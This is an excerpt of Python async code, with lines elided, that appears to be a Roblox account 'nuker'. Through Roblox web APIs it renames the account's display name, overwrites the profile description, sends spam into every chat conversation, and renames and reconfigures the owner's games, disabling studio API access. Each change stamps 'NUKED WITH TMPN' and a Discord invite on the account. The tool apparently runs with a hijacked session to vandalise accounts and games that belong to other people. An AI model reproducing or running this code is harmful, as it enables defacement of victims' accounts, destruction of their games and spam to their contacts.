...
async def change_name(session, id):
    async with session.get(f"https://users.roblox.com/v1/users/{id}/display-names/validate?displayName=aaaaa", ssl=False) as response:
        if response.status == 200:
            async with session.patch(f"https://users.roblox.com/v1/users/{id}/display-names", json={"newDisplayName": "NUKED-WITH-TMPN"}, ssl=False) as response:
                if response.status == 200:
...
async def change_desc(session):
    async with session.post("https://users.roblox.com/v1/description", json={"description": "NUKED WITH TMPN .gg/ME2Bm956nD"}, ssl=False) as response:
        if response.status == 200:
...
async def send_message(session, conv):
    async with session.post("https://chat.roblox.com/v2/send-message", json={"conversationId": conv["id"], "message": "NUKED WITH TMPN"}, ssl=False) as response:
        if response.status == 200:
            data = await response.json()
...
async def modify_game(session, id):
    async with session.patch(f"https://develop.roblox.com/v2/universes/{id}/configuration", json={"name":"NUKED WITH TMPN .gg/ME2Bm956nD","description":"NUKED WITH TMPN .gg/ME2Bm956nD","studioAccessToApisAllowed":False}, ssl=False) as response:
        if response.status == 200:
